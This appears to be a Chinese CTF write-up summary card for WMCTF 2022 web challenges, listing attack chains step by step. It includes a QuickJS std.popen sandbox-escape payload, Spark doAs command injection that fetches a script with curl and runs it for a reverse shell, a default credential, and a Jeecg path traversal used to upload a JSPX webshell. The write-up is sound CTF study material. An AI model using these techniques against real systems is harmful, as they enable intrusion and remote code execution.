---
title: "2022 WMCTF WP"
category: web
tags: ["WMCTF 2022 (W & M CTF)", "web", "CVE-2022-28927", "subconverter", "QuickJS", "std.popen"]
signals: ["WMCTF 2022 (W & M CTF) 2022", "CVE-2022-28927", "subconverter", "QuickJS", "std.popen", "SSRF-internal", "Hadoop-Spark", "doAs", "K8s", "lfi", "ssrf", "rce", "web_unknown", "WMCTF"]
difficulty: hard
source: "https://www.ctfiot.com/53857.html"
tools: ["Java", "curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 WMCTF WP

> 赛事：WMCTF 2022 (W & M CTF) 2022 | 方向：web | 难度：hard | 工具：Java、curl

## 一句话总结

WMCTF 2022 4 大题：CVE-2022-28927+QuickJS+Hadoop SSRF+Jeecg path traversal

## 攻击链

1. Web subconverter: CVE-2022-28927 subconverter 任意文件读 pref.toml 拿 token
2. QuickJS std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r') JS 沙箱逃逸 RCE
3. URL md5 文件名作为 script 路径 + token → /sub?url=script:cache/...&token=...&target=quanx
4. Java: 扫内网 10.244.0.x:8080 找 Hadoop Spark
5. POST /file doAs=;curl+http://.../>/tmp/1 URL 编码绕过
6. 再次 doAs=bash /tmp/1 反弹 shell
7. nanoScore: /users 注册用户列表 + 默认密码 Ha1c9on/123456 拿 W&M 队账号
8. easyjeecg: /toLogin.do/..;/jeecgFormDemoController.do?saveFiles 路径穿越 + JSPX webshell 上传

## 关键 payload

```
QuickJS: std.popen(''/readflag > /app/flag1;/app/readflag > /app/flag2'', ''r'')
```

## 经验教训

QuickJS std.popen 沙箱逃逸；Spark doAs URL 编码绕过；Jeecg 路径穿越 /..;/ 是经典

## 标签

CVE-2022-28927、subconverter、QuickJS、std.popen、SSRF-internal、Hadoop-Spark、doAs、K8s、Jeecg-boot、path-traversal、/toLogin.do/..;/

## 参考来源

- https://www.ctfiot.com/53857.html
- 原文件：2022_WMCTF-wp.full.md
